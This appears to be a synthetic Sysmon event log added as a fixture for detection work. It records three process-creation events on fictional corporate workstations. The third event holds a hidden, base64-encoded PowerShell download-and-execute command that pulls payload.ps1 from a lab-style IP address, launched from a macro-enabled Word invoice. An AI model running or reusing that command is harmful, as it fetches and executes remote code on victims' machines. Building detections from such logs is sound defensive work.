@@ -1,0 +1,131 @@
+<Events xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-05-04T14:32:18.4127653Z"/>
+      <EventRecordID>184523</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3284" ThreadID="4912"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WS-FINANCE-07.corp.example.com</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-05-04 14:32:18.410</Data>
+      <Data Name="ProcessGuid">{A3D0F9C2-8B41-6817-3A02-000000004B00}</Data>
+      <Data Name="ProcessId">7412</Data>
+      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">whoami - displays logged on user information</Data>
+      <Data Name="Product">Microsoft&#xAE; Windows&#xAE; Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">whoami.exe</Data>
+      <Data Name="CommandLine">whoami /all</Data>
+      <Data Name="CurrentDirectory">C:\Users\jdoe\</Data>
+      <Data Name="User">CORP\jdoe</Data>
+      <Data Name="LogonGuid">{A3D0F9C2-71A3-6817-9F4C-1A0000000000}</Data>
+      <Data Name="LogonId">0x1a4cf9</Data>
+      <Data Name="TerminalSessionId">2</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=A8F5A9E5C2B0D6F1B4D9C3E7A2F5B8E1D4C7A0F3,MD5=B3C9E0A1D5F2E8C4B6A7D0E3F1C2B5A8,SHA256=4F7C2A8E1D5B9F3C6A0E4B7D2F8C1E5A9B3D6F0C2E8A4B7D1F5C9E3A6B0D4F8C,IMPHASH=E5F9C2A8D1B4F7E0C3A6D9F2B5E8C1A4</Data>
+      <Data Name="ParentProcessGuid">{A3D0F9C2-71B7-6817-1F02-000000004B00}</Data>
+      <Data Name="ParentProcessId">5832</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" </Data>
+      <Data Name="ParentUser">CORP\jdoe</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-05-04T15:08:42.7841290Z"/>
+      <EventRecordID>184687</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3284" ThreadID="4912"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WS-DEV-12.corp.example.com</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">-</Data>
+      <Data Name="UtcTime">2026-05-04 15:08:42.781</Data>
+      <Data Name="ProcessGuid">{B7E2C1A4-9F0A-6817-5E03-000000004B00}</Data>
+      <Data Name="ProcessId">9248</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1320 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Windows PowerShell</Data>
+      <Data Name="Product">Microsoft&#xAE; Windows&#xAE; Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">PowerShell.EXE</Data>
+      <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-Process | Where-Object {$_.CPU -gt 10}"</Data>
+      <Data Name="CurrentDirectory">C:\Users\asmith\Documents\</Data>
+      <Data Name="User">CORP\asmith</Data>
+      <Data Name="LogonGuid">{B7E2C1A4-7E92-6817-2C71-3F0000000000}</Data>
+      <Data Name="LogonId">0x3f712c</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">Medium</Data>
+      <Data Name="Hashes">SHA1=8C7E3F1B2A9D4E6C0F5B8A1D3E7C2F9B6A4D0E1C,MD5=D4F1A8B2C9E0F3A5D7B1C4E8F2A6B9D3,SHA256=A9F2C5E8B1D4F7A0C3E6B9D2F5A8C1E4B7D0F3A6C9E2B5D8F1A4C7E0B3D6F9A2,IMPHASH=F1A4D7B0C3E6F9A2D5B8C1E4F7A0D3B6</Data>
+      <Data Name="ParentProcessGuid">{B7E2C1A4-9E48-6817-4D03-000000004B00}</Data>
+      <Data Name="ParentProcessId">7104</Data>
+      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe" /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-Process | Where-Object {$_.CPU -gt 10}"</Data>
+      <Data Name="ParentUser">CORP\asmith</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
+      <EventID>1</EventID>
+      <Version>5</Version>
+      <Level>4</Level>
+      <Task>1</Task>
+      <Opcode>0</Opcode>
+      <Keywords>0x8000000000000000</Keywords>
+      <TimeCreated SystemTime="2026-05-04T03:17:09.2395814Z"/>
+      <EventRecordID>184912</EventRecordID>
+      <Correlation/>
+      <Execution ProcessID="3284" ThreadID="4912"/>
+      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
+      <Computer>WS-HR-04.corp.example.com</Computer>
+      <Security UserID="S-1-5-18"/>
+    </System>
+    <EventData>
+      <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
+      <Data Name="UtcTime">2026-05-04 03:17:09.236</Data>
+      <Data Name="ProcessGuid">{C8F3D2B5-A01B-6817-7F04-000000004B00}</Data>
+      <Data Name="ProcessId">11420</Data>
+      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="FileVersion">10.0.19041.1320 (WinBuild.160101.0800)</Data>
+      <Data Name="Description">Windows PowerShell</Data>
+      <Data Name="Product">Microsoft&#xAE; Windows&#xAE; Operating System</Data>
+      <Data Name="Company">Microsoft Corporation</Data>
+      <Data Name="OriginalFileName">PowerShell.EXE</Data>
+      <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==</Data>
+      <Data Name="CurrentDirectory">C:\Users\mlopez\AppData\Local\Temp\</Data>
+      <Data Name="User">CORP\mlopez</Data>
+      <Data Name="LogonGuid">{C8F3D2B5-89A1-6817-8B92-7C0000000000}</Data>
+      <Data Name="LogonId">0x7c8b92</Data>
+      <Data Name="TerminalSessionId">1</Data>
+      <Data Name="IntegrityLevel">High</Data>
+      <Data Name="Hashes">SHA1=8C7E3F1B2A9D4E6C0F5B8A1D3E7C2F9B6A4D0E1C,MD5=D4F1A8B2C9E0F3A5D7B1C4E8F2A6B9D3,SHA256=A9F2C5E8B1D4F7A0C3E6B9D2F5A8C1E4B7D0F3A6C9E2B5D8F1A4C7E0B3D6F9A2,IMPHASH=F1A4D7B0C3E6F9A2D5B8C1E4F7A0D3B6</Data>
+      <Data Name="ParentProcessGuid">{C8F3D2B5-A018-6817-6E04-000000004B00}</Data>
+      <Data Name="ParentProcessId">10876</Data>
+      <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
+      <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\mlopez\Downloads\Invoice_Q2_2026.docm"</Data>
+      <Data Name="ParentUser">CORP\mlopez</Data>
+    </EventData>
+  </Event>
+</Events>
